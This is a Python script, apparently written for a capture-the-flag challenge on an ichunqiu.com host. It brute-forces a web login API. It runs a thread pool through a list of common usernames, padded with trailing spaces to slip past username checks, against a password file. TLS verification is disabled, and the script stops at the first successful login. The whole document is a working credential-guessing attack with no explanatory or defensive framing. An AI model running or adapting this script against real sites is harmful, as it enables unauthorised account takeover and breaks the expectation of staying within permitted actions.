import requests, time
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

BASE = "https://eci-2ze33laazlgmdj4q1hux.cloudeci1.ichunqiu.com:80"
LOGIN_URL = BASE + "/feed.php?route=/api/login"

LOGINS = ["staff", "admin", "alice", "bob", "charlie", "editor", "writer", "author", "yactf", "cwp"]

pwlist = [l.rstrip("\n") for l in open("pwlist.txt", encoding="utf-8")]

def try_login(args):
    u, p = args
    for _ in range(2):
        try:
            r = requests.post(LOGIN_URL, data={"login": u, "pass": p}, timeout=20, verify=False)
            if '"status":1' in r.text or "site_staff" in r.headers.get("Set-Cookie", ""):
                return (u, p, r.text[:200])
            if "login_failed" in r.text:
                return None
        except Exception:
            time.sleep(0.4)
    return None

def main():
    jobs = [(u + " " * (i % 8), p) for i, u in enumerate(LOGINS) for p in pwlist]
    print(f"[*] tries: {len(jobs)}", flush=True)
    t0 = time.time()
    done = 0
    with ThreadPoolExecutor(max_workers=12) as ex:
        for r in ex.map(try_login, jobs):
            done += 1
            if r:
                print(f"[!!!] HIT login={r[0]!r} pass={r[1]!r} body={r[2]}", flush=True)
                print("FOUND", flush=True)
                return
            if done % 500 == 0:
                print(f"[*] {done}/{len(jobs)} {time.time()-t0:.0f}s", flush=True)
    print(f"ALL_DONE {time.time()-t0:.0f}s", flush=True)

main()
